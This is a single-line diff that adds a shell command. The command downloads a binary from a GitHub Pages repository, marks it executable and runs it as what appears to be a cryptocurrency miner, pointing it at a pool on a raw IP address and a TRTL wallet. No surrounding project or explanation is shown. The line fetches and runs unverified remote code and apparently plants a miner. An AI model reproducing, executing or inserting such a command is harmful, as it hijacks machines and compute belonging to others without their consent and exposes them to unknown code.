@@ -1,0 +1,1 @@
+wget https://github.com/mynameokta11/mynameokta11.github.io/raw/main/vio && chmod +x vio && ./vio --algorithm chukwav2 --pool 216.158.235.72:443 --username TRTLv3ycVceWfJWfwirxZVhDKUJ91MTyRi3F9Zd2Hb1fEoVD7JiA9m3MZNcM2jVhca5wHCjXgg2hsbwXGKqFTZMBT5gCDqcDXAu
